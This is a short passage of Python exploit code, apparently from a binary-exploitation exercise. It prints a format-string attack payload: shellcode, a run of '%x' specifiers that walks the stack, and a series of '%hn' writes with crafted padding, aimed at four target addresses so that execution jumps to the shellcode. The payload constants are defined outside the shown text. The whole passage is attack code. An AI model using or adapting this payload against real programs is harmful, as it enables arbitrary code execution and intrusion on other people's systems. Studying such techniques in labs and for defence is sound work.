...
with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(SHELLCODE + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10111' + b'x' + b'%hn' + b'%' + b'32768x' + b'%hn' + b'%' + b'32769x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
